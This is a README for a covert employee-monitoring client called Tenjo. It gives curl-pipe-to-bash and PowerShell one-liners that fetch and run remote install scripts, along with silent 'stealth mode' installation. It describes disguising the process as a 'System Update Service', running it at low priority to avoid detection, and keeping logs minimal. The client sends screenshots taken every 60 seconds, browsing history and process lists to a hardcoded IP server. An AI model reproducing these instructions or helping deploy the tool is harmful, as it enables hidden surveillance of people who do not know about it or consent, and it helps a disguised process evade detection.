# Tenjo Client - Employee Monitoring System

## Overview
Silent employee monitoring system that runs in background without user notification.

## 🚀 **One-Line Installation (Recommended)**

### Windows (Run as Administrator)
```cmd
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/install.bat' -OutFile 'install.bat'; .\install.bat"
```

### macOS
```bash
curl -sSL https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/install.sh | bash
```

## 📦 **Alternative: Download and Run**

### Windows Installation
1. **Download** `easy_install_windows.bat` from GitHub
2. **Right-click** → "Run as administrator"
3. **Enter** your dashboard server URL
4. **Wait** for installation to complete

### macOS Installation  
1. **Download** `easy_install_macos.sh` from GitHub
2. **Open Terminal** and run:
```bash
chmod +x easy_install_macos.sh
./easy_install_macos.sh
```
3. **Enter** your dashboard server URL
4. **Wait** for installation to complete

## Features
- ✅ **Silent Installation** - No user prompts or notifications during operation
- ✅ **Auto-Start** - Automatically starts on system boot
- ✅ **Stealth Mode** - Runs hidden in background as "System Update Service"
- ✅ **Cross-Platform** - Works on Windows and macOS
- ✅ **Self-Contained** - Installs dependencies automatically
- ✅ **Easy Uninstall** - Simple removal scripts included

## Monitoring Features
- 📸 **Screenshot capture** every 60 seconds
- 🌐 **Browser activity** monitoring (URLs, titles, time spent)
- 💻 **Process monitoring** (running applications)
- 📊 **URL tracking** with duration
- 📡 **Silent data transmission** to dashboard server

## 🗑️ **Easy Uninstallation**

### Windows Uninstall (Run as Administrator)
```cmd
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/uninstall_windows.bat' -OutFile 'uninstall.bat'; .\uninstall.bat"
```

### macOS Uninstall
```bash
curl -sSL https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/uninstall_macos.sh | bash
```

## Technical Details

### Installation Locations
- **Windows**: `%APPDATA%\SystemUpdate`
- **macOS**: `~/.system_update`

### Auto-Start Configuration
- **Windows**: Windows Task Scheduler (`system_update_service`)
- **macOS**: LaunchAgent (`com.system.update.service`)

### Process Information
- **Service Name**: "System Update Service"
- **Priority**: Low (to avoid detection)
- **Network**: Communicates with dashboard server
- **Dependencies**: Auto-installs Python packages as needed

## Server Configuration

### Default Server
- **URL**: `http://103.129.149.67`
- **Protocol**: HTTP/HTTPS supported
- **Port**: Configurable during installation

### Custom Server Installation
**Windows:**
```cmd
easy_install_windows.bat
# Enter custom URL when prompted: http://103.129.149.67
```

**macOS:**
```bash
./easy_install_macos.sh
# Enter custom URL when prompted: http://103.129.149.67
```

## Advanced Installation (Stealth Mode)

For completely silent installation without user interaction:

### Windows Silent Install
```cmd
install_windows.bat http://103.129.149.67
```

### macOS Silent Install
```bash
./install_macos.sh http://103.129.149.67
```

## Troubleshooting

### Common Issues
1. **"Access Denied"** - Run as Administrator (Windows) or with sudo (macOS)
2. **"Python not found"** - Script will auto-install Python
3. **"Network error"** - Check server URL and network connection
4. **"Service not starting"** - Check firewall and antivirus settings

### Manual Removal
If uninstall scripts don't work:

**Windows:**
```cmd
schtasks /delete /tn "system_update_service" /f
reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SystemUpdate" /f
rmdir /s /q "%APPDATA%\SystemUpdate"
```

**macOS:**
```bash
launchctl unload ~/Library/LaunchAgents/com.system.update.service.plist
rm ~/Library/LaunchAgents/com.system.update.service.plist
rm -rf ~/.system_update
```

## Support
- Monitoring runs completely in background
- No visible interface or notifications
- Automatic restart if process crashes
- Logs are minimized for stealth operation
